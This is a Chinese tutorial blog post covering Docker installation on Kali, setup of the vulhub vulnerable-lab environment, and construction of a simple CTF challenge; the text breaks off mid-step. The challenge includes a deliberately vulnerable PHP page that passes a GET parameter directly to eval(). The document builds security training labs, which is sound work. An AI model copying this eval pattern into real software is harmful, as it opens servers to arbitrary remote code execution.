    <content type="html"><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>1、curl -fsSL <a href="https://download.docker.com/linux/debian/gpg">https://download.docker.com/linux/debian/gpg</a> | sudo apt-key add -</p><p>2、echo ‘deb <a href="https://download.docker.com/linux/debian">https://download.docker.com/linux/debian</a> stretch stable’&gt; /etc/apt/sources.list.d/docker.list</p><p>3、apt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-common</p><p>4、apt-get update</p><p>5、sudo apt install docker.io</p><p>6、检查docker安装情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker</span><br><br>Usage:  docker [OPTIONS] COMMAND<br><br>A self-sufficient runtime <span class="hljs-keyword">for</span> containers<br><br>Options:<br>      --config string      Location of client config files (default <span class="hljs-string">&quot;/root/.docker&quot;</span>)<br>  -c, --context string     Name of the context to use to connect to the daemon (overrides DOCKER_HOST env var and default context <span class="hljs-built_in">set</span> with<br>                           <span class="hljs-string">&quot;docker context use&quot;</span>)<br>  -D, --debug              Enable debug mode<br>  -H, --host list          Daemon socket(s) to connect to<br>  -l, --log-level string   Set the logging level (<span class="hljs-string">&quot;debug&quot;</span>|<span class="hljs-string">&quot;info&quot;</span>|<span class="hljs-string">&quot;warn&quot;</span>|<span class="hljs-string">&quot;error&quot;</span>|<span class="hljs-string">&quot;fatal&quot;</span>) (default <span class="hljs-string">&quot;info&quot;</span>)<br>      --tls                Use TLS; implied by --tlsverify<br>      --tlscacert string   Trust certs signed only by this CA (default <span class="hljs-string">&quot;/root/.docker/ca.pem&quot;</span>)<br>      --tlscert string     Path to TLS certificate file (default <span class="hljs-string">&quot;/root/.docker/cert.pem&quot;</span>)<br>      --tlskey string      Path to TLS key file (default <span class="hljs-string">&quot;/root/.docker/key.pem&quot;</span>)<br>      --tlsverify          Use TLS and verify the remote<br>  -v, --version            Print version information and quit<br><br>Management Commands:<br>  builder     Manage builds<br>  config      Manage Docker configs<br>  container   Manage containers<br>  context     Manage contexts<br>  image       Manage images<br>  manifest    Manage Docker image manifests and manifest lists<br>  network     Manage networks<br>  node        Manage Swarm nodes<br>  plugin      Manage plugins<br>  secret      Manage Docker secrets<br>  service     Manage services<br>  stack       Manage Docker stacks<br>  swarm       Manage Swarm<br>  system      Manage Docker<br>  trust       Manage trust on Docker images<br>  volume      Manage volumes<br><br>Commands:<br>  attach      Attach <span class="hljs-built_in">local</span> standard input, output, and error streams to a running container<br>  build       Build an image from a Dockerfile<br>  commit      Create a new image from a container<span class="hljs-string">&#x27;s changes</span><br><span class="hljs-string">  cp          Copy files/folders between a container and the local filesystem</span><br><span class="hljs-string">  create      Create a new container</span><br><span class="hljs-string">  diff        Inspect changes to files or directories on a container&#x27;</span>s filesystem<br>  events      Get real time events from the server<br>  <span class="hljs-built_in">exec</span>        Run a <span class="hljs-built_in">command</span> <span class="hljs-keyword">in</span> a running container<br>  <span class="hljs-built_in">export</span>      Export a container<span class="hljs-string">&#x27;s filesystem as a tar archive</span><br><span class="hljs-string">  history     Show the history of an image</span><br><span class="hljs-string">  images      List images</span><br><span class="hljs-string">  import      Import the contents from a tarball to create a filesystem image</span><br><span class="hljs-string">  info        Display system-wide information</span><br><span class="hljs-string">  inspect     Return low-level information on Docker objects</span><br><span class="hljs-string">  kill        Kill one or more running containers</span><br><span class="hljs-string">  load        Load an image from a tar archive or STDIN</span><br><span class="hljs-string">  login       Log in to a Docker registry</span><br><span class="hljs-string">  logout      Log out from a Docker registry</span><br><span class="hljs-string">  logs        Fetch the logs of a container</span><br><span class="hljs-string">  pause       Pause all processes within one or more containers</span><br><span class="hljs-string">  port        List port mappings or a specific mapping for the container</span><br><span class="hljs-string">  ps          List containers</span><br><span class="hljs-string">  pull        Pull an image or a repository from a registry</span><br><span class="hljs-string">  push        Push an image or a repository to a registry</span><br><span class="hljs-string">  rename      Rename a container</span><br><span class="hljs-string">  restart     Restart one or more containers</span><br><span class="hljs-string">  rm          Remove one or more containers</span><br><span class="hljs-string">  rmi         Remove one or more images</span><br><span class="hljs-string">  run         Run a command in a new container</span><br><span class="hljs-string">  save        Save one or more images to a tar archive (streamed to STDOUT by default)</span><br><span class="hljs-string">  search      Search the Docker Hub for images</span><br><span class="hljs-string">  start       Start one or more stopped containers</span><br><span class="hljs-string">  stats       Display a live stream of container(s) resource usage statistics</span><br><span class="hljs-string">  stop        Stop one or more running containers</span><br><span class="hljs-string">  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE</span><br><span class="hljs-string">  top         Display the running processes of a container</span><br><span class="hljs-string">  unpause     Unpause all processes within one or more containers</span><br><span class="hljs-string">  update      Update configuration of one or more containers</span><br><span class="hljs-string">  version     Show the Docker version information</span><br><span class="hljs-string">  wait        Block until one or more containers stop, then print their exit codes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Run &#x27;</span>docker COMMAND --<span class="hljs-built_in">help</span><span class="hljs-string">&#x27; for more information on a command.</span><br><span class="hljs-string"></span><br><span class="hljs-string">To get more help with docker, check out our guides at https://docs.docker.com/go/guides/</span><br></code></pre></td></tr></table></figure><p>显示docker信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/桌面]<br>└─<span class="hljs-comment"># docker -v               </span><br>Docker version 20.10.5+dfsg1, build 55c4c88<br>                                                                                                                                                    <br>┌──(root💀kali)-[/home/kali/桌面]<br>└─<span class="hljs-comment"># docker ps -a</span><br>CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES<br></code></pre></td></tr></table></figure><p>启动docker服务器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">service docker start<br></code></pre></td></tr></table></figure><p>安装compose</p><p>Docker-Compose项目是Docker官方的开源项目，负责实现对Docker容器集群的快速编排。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">apt install docker-compose<br>  <br>pip install docker-compose<br>pip3 install docker-compose<br></code></pre></td></tr></table></figure><p>Docker安装测试（hello-world）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php">└─<span class="hljs-comment"># docker run hello-world</span><br>Unable to find image <span class="hljs-string">&#x27;hello-world:latest&#x27;</span> locally<br>latest: Pulling <span class="hljs-keyword">from</span> library/hello-world<br>b8dfde127a29: Pull complete <br>Digest: sha256:<span class="hljs-number">0</span>fe98d7debd9049c50b597ef1f85b7c1e8cc81f59c8d623fcb2250e8bec85b38<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> hello-world:latest<br><br>Hello <span class="hljs-keyword">from</span> Docker!                                                                                                                                                             <br>This message shows that your installation appears to be working correctly.                                                                                                     <br><br>To generate this message, Docker took the following steps:<br> <span class="hljs-number">1.</span> The Docker client contacted the Docker daemon.<br> <span class="hljs-number">2.</span> The Docker daemon pulled the <span class="hljs-string">&quot;hello-world&quot;</span> image <span class="hljs-keyword">from</span> the Docker Hub.<br>    (amd64)<br> <span class="hljs-number">3.</span> The Docker daemon created a <span class="hljs-keyword">new</span> container <span class="hljs-keyword">from</span> that image which runs the<br>    executable that produces the output you are currently reading.<br> <span class="hljs-number">4.</span> The Docker daemon streamed that output to the Docker client, which sent it<br>    to your terminal.<br><br>To <span class="hljs-keyword">try</span> something more ambitious, you can run an Ubuntu container with:<br> $ docker run -it ubuntu bash<br><br>Share images, automate workflows, <span class="hljs-keyword">and</span> more with a free Docker ID:<br> https:<span class="hljs-comment">//hub.docker.com/</span><br><br><span class="hljs-keyword">For</span> more examples <span class="hljs-keyword">and</span> ideas, visit:<br> https:<span class="hljs-comment">//docs.docker.com/get-started/</span><br></code></pre></td></tr></table></figure><h1 id="设置docker镜像加速"><a href="#设置docker镜像加速" class="headerlink" title="设置docker镜像加速"></a>设置docker镜像加速</h1><p>这个是需要设置的</p><ul><li>进入阿里云容器镜像服务:<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></li><li>根据底下配置方法进行配置</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">vim /etc/docker/daemon.json<br><br><span class="hljs-comment"># 添加如下内容，具体地址自己申请咯</span><br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://****.mirror.aliyuncs.com&quot;</span>]<br>&#125;<br><br><span class="hljs-comment"># 重启服务</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><h1 id="搭建vulhub漏洞靶机环境"><a href="#搭建vulhub漏洞靶机环境" class="headerlink" title="搭建vulhub漏洞靶机环境"></a>搭建vulhub漏洞靶机环境</h1><p>1、从官网克隆vulhub</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git<br></code></pre></td></tr></table></figure><p> 3、完成之后cd vulhub 目录下 ls 查看目录，出现如下图，即安装完成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulhub]<br>└─$ ls<br>activemq    contributors.md        elasticsearch  gitlist      java     libssh          nginx       phpunit          samba       thinkphp   zabbix<br>apereo-cas  contributors.zh-cn.md  electron       glassfish    jboss    LICENSE         node        postgres         scrapy      tikiwiki<br>appweb      couchdb                fastjson       goahead      jenkins  liferay-portal  ntopng      python           shiro       tomcat<br>aria2       discuz                 ffmpeg         gogs         jetty    log4j           ofbiz       rails            skywalking  unomi<br>base        django                 flask          h2database   jira     magento         opensmtpd   README.md        solr        uwsgi<br>bash        dns                    flink          hadoop       jmeter   mini_httpd      openssh     README.zh-cn.md  spark       weblogic<br>celery      docker                 ghostscript    httpd        joomla   mojarra         openssl     redis            spring      webmin<br>cgi         drupal                 git            imagemagick  jupyter  mongo-express   php         rsync            struts2     wordpress<br>coldfusion  dubbo                  gitea          influxdb     kibana   mysql           phpmailer   ruby             supervisor  xstream<br>confluence  ecshop                 gitlab         jackson      laravel  nexus           phpmyadmin  saltstack        tests       xxl-job<br></code></pre></td></tr></table></figure><p>下面随便进入一个目录，选择struts2，启动s2-001测试环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(root💀kali)-[/home/kali/vulhub/struts2/s2<span class="hljs-number">-001</span>]<br>└─<span class="hljs-comment"># docker-compose build           </span><br>Building struts2<br>Sending build context to Docker daemon  <span class="hljs-number">3.697</span>MB<br>Step <span class="hljs-number">1</span>/<span class="hljs-number">5</span> : <span class="hljs-keyword">FROM</span> vulhub/tomcat:<span class="hljs-number">8.5</span><br> ---&gt; <span class="hljs-number">66</span>ba03f6c1d8<br>Step <span class="hljs-number">2</span>/<span class="hljs-number">5</span> : LABEL maintainer=<span class="hljs-string">&quot;phithon &lt;root@leavesongs.com&gt;&quot;</span><br> ---&gt; Using cache<br> ---&gt; <span class="hljs-number">51</span>ccd85e21c0<br>Step <span class="hljs-number">3</span>/<span class="hljs-number">5</span> : RUN set -ex     &amp;&amp; rm -rf /usr/local/tomcat/webapps<span class="hljs-comment">/*     &amp;&amp; chmod a+x /usr/local/tomcat/bin/*.sh</span><br><span class="hljs-comment"> ---&gt; Using cache</span><br><span class="hljs-comment"> ---&gt; 0a903d3b8d2e</span><br><span class="hljs-comment">Step 4/5 : COPY S2-001.war /usr/local/tomcat/webapps/ROOT.war</span><br><span class="hljs-comment"> ---&gt; Using cache</span><br><span class="hljs-comment"> ---&gt; 46e97211b80a</span><br><span class="hljs-comment">Step 5/5 : EXPOSE 8080</span><br><span class="hljs-comment"> ---&gt; Using cache</span><br><span class="hljs-comment"> ---&gt; 4d93a32927c7</span><br><span class="hljs-comment">Successfully built 4d93a32927c7</span><br><span class="hljs-comment">Successfully tagged s2-001_struts2:latest</span><br><span class="hljs-comment">                                                                                                                                                                              </span><br><span class="hljs-comment">┌──(root💀kali)-[/home/kali/vulhub/struts2/s2-001]</span><br><span class="hljs-comment">└─# docker-compose up -d           </span><br><span class="hljs-comment">Creating network &quot;s2-001_default&quot; with the default driver</span><br><span class="hljs-comment">Creating s2-001_struts2_1 ... done</span><br></code></pre></td></tr></table></figure><p>查看docker进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/vulhub/struts2/s2-001]<br>└─<span class="hljs-comment"># docker ps -a</span><br>CONTAINER ID   IMAGE            COMMAND             CREATED              STATUS                      PORTS                    NAMES<br>d5fb2a7ca4c2   s2-001_struts2   <span class="hljs-string">&quot;catalina.sh run&quot;</span>   About a minute ago   Up About a minute           0.0.0.0:8080-&gt;8080/tcp   s2-001_struts2_1<br>f4417e29b119   hello-world      <span class="hljs-string">&quot;/hello&quot;</span>            11 minutes ago       Exited (0) 11 minutes ago                            focused_kapitsa<br></code></pre></td></tr></table></figure><p>访问IP:8080,搭建成功</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1629010820153-8ee94897-91a4-4032-9311-e1505960118b.png" alt="img"></p><p>关闭docker 环境 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/vulhub/struts2/s2-001]<br>└─<span class="hljs-comment"># docker-compose down -v </span><br>Stopping s2-001_struts2_1 ... <span class="hljs-keyword">done</span><br>Removing s2-001_struts2_1 ... <span class="hljs-keyword">done</span><br>Removing network s2-001_default<br></code></pre></td></tr></table></figure><h1 id="CTF题目搭建"><a href="#CTF题目搭建" class="headerlink" title="CTF题目搭建"></a>CTF题目搭建</h1><p>[</p><p>](<a href="https://blog.csdn.net/q20010619/article/details/108587879">https://blog.csdn.net/q20010619/article/details/108587879</a>)</p><p><strong>docker常用命令</strong></p><p>1.拉取镜像。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker pull [image]<br></code></pre></td></tr></table></figure><p>2.查看docker当前镜像。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker image ls 或 docker images<br></code></pre></td></tr></table></figure><p>3.新建一个docker容器，并映射端口号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker run -d -p [host port]:[docker port] [image]<br></code></pre></td></tr></table></figure><p>4.查看运行中的docker容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker ps -a<br></code></pre></td></tr></table></figure><p>5.进入一个docker容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker <span class="hljs-built_in">exec</span> -it [container id] bash<br></code></pre></td></tr></table></figure><p>6.拷贝本地文件到docker。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker cp [本地路径] [container id]:[container 路径]<br></code></pre></td></tr></table></figure><p>7.启动/停止一个docker容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker stop [container id]<br>$ docker start [container id]<br></code></pre></td></tr></table></figure><p>8.删除一个docker容器。</p><p>（注意：需要先把容器停止才可以删除。）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker rm [container id]<br></code></pre></td></tr></table></figure><p>9.删除一个docker镜像</p><p>（注意：在镜像对应的容器后才可以删除镜像ID。）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker rmi [image id]<br><br><br>遇到的问题<br>Error response from daemon: conflict: unable to delete 66ba03f6c1d8 (cannot be forced) - image has dependent child images<br><br>解决方法：https://blog.csdn.net/sunmingyang1987/article/details/104493245<br>└─<span class="hljs-comment"># docker rmi vulhub/tomcat:8.5</span><br>Untagged: vulhub/tomcat:8.5<br>Untagged: vulhub/tomcat@sha256:9b0989a0ac483d2ce309427123b44d21fddcad48159960064b5c6695270ef2ac<br></code></pre></td></tr></table></figure><p>将容器转换为镜像（固化）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$docker</span> commit 容器ID 用户名/仓库1<br><span class="hljs-comment">#用户名/仓库可以随便写，无需上纲上线，我写的是lhy/test</span><br></code></pre></td></tr></table></figure><p>将镜像转换为文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$docker</span> save -o /path/文件名 镜像名<br></code></pre></td></tr></table></figure><p><strong>使用docker搭建一道简单的ctf题目</strong></p><p>1.搜索lamp环境的docker镜像。</p><p>docker search lamp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker search lamp      </span><br>NAME                                    DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED<br>mattrayner/lamp                         A simple LAMP docker image running the prere…   285                  [OK]<br>linode/lamp                             LAMP on Ubuntu 14.04.1 LTS Container            181                  <br>tutum/lamp                              Out-of-the-box LAMP image (PHP+MySQL)           148                  <br>fauria/lamp                             Modern, developer friendly LAMP stack. Inclu…   110                  [OK]<br>greyltc/lamp                            a super secure, up-to-date and lightweight L…   103                  [OK]                0                    <br></code></pre></td></tr></table></figure><p>2.拉取“tutum/lamp”镜像。</p><p>docker pull tutum/lamp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker pull tutum/lamp  </span><br>Using default tag: latest<br>latest: Pulling from tutum/lamp<br>Image docker.io/tutum/lamp:latest uses outdated schema1 manifest format. Please upgrade to a schema2 image <span class="hljs-keyword">for</span> better future compatibility. More information at https://docs.docker.com/registry/spec/deprecated-schema-v1/<br>8387d9ff0016: Pull complete <br>3b52deaaf0ed: Pull complete <br>4bd501fad6de: Pull complete <br>a3ed95caeb02: Pull complete <br>790f0e8363b9: Pull complete <br>11f87572ad81: Pull complete <br>341e06373981: Pull complete <br>709079cecfb8: Pull complete <br>55bf9bbb788a: Pull complete <br>b41f3cfd3d47: Pull complete <br>70789ae370c5: Pull complete <br>43f2fd9a6779: Pull complete <br>6a0b3a1558bd: Pull complete <br>934438c9af31: Pull complete <br>1cfba20318ab: Pull complete <br>de7f3e54c21c: Pull complete <br>596da16c3b16: Pull complete <br>e94007c4319f: Pull complete <br>3c013e645156: Pull complete <br>Digest: sha256:d332e7e97606ac6407b0ba9ae9e9383c89d7e04c6f4853332e98f7d326408329<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> tutum/lamp:latest<br>docker.io/tutum/lamp:latest<br></code></pre></td></tr></table></figure><p>3.拉取完成以后，查看本地docker镜像。</p><p>docker images</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/桌面]<br>└─<span class="hljs-comment"># docker images</span><br>REPOSITORY       TAG               IMAGE ID       CREATED         SIZE<br>python           3.7-slim-buster   1241d4388782   3 months ago    113MB<br>hello-world      latest            d1165f221234   8 months ago    13.3kB<br>mariadb          10.4.12           b6184b68d1fd   19 months ago   357MB<br>tutum/lamp       latest            3d49e175ec00   5 years ago     427MB<br></code></pre></td></tr></table></figure><p>4.新建一个docker容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker run --name=lamp -d -p 8080:80 -p 3306:3306 -v /var/www/app/lamp/:/var/www/html tutum/lamp</span><br>941e5ff0bd2f8c704ff54a952709e7ead035235cf89a287d7894524596507451<br><br>-d //容器后台运行。<br>-p //指定映射端口。<br></code></pre></td></tr></table></figure><p>5.查看系统中运行的docker容器。</p><p>docker ps -a</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker ps -a                                                                                    </span><br>CONTAINER ID   IMAGE         COMMAND     CREATED          STATUS                    PORTS                                          NAMES<br>941e5ff0bd2f   tutum/lamp    <span class="hljs-string">&quot;/run.sh&quot;</span>   23 seconds ago   Up 22 seconds             0.0.0.0:3306-&gt;3306/tcp, 0.0.0.0:8080-&gt;80/tcp   lamp<br>f4417e29b119   hello-world   <span class="hljs-string">&quot;/hello&quot;</span>    3 months ago     Exited (0) 3 months ago                                                  focused_kapitsa<br></code></pre></td></tr></table></figure><p>6.开启apache服务,使用浏览器访问一下主页，查看映射是否正常。</p><p>开启apache服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br></code></pre></td></tr></table></figure><p>然后浏览器访问localhost:8080即可</p><p>7.进入docker container。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker exec -it 941e5ff0bd2f bash                                                                                                                                   1 ⨯</span><br>root@941e5ff0bd2f:/<span class="hljs-comment"># </span><br><br>-i //让容器的标准输入保持打开。<br>-t //让docker分配一个伪终端并绑定到容器的标准输出上。<br>941e5ff0bd2f 容器id<br></code></pre></td></tr></table></figure><p>安装vim</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker exec -it 941e5ff0bd2f bash                                                                                                                                   1 ⨯</span><br>root@941e5ff0bd2f:/<span class="hljs-comment"># sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span><br>root@941e5ff0bd2f:/<span class="hljs-comment"># apt-get clean</span><br>root@941e5ff0bd2f:/<span class="hljs-comment"># apt-get update</span><br>root@941e5ff0bd2f:/<span class="hljs-comment"># apt-get install vim</span><br></code></pre></td></tr></table></figure><p>设置flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@941e5ff0bd2f:/<span class="hljs-comment"># echo &quot;flag&#123;test_flag&#125;&quot; &gt; /flag</span><br>root@941e5ff0bd2f:/<span class="hljs-comment"># cat /flag</span><br>flag&#123;test_flag&#125;<br>root@941e5ff0bd2<br></code></pre></td></tr></table></figure><p>设置题目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@941e5ff0bd2f:/<span class="hljs-comment"># vi /var/www/html/rce.php</span><br>root@941e5ff0bd2f:/<span class="hljs-comment"># cat /var/www/html/rce.php</span><br>&lt;?php<br>error_reporting(0);<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$c</span>);<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>测试一下phpinfo</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1637592355122-f98b9eed-2a40-47d3-8923-e62d412263f4.png" alt="img"></p><p>flag：</p><figure 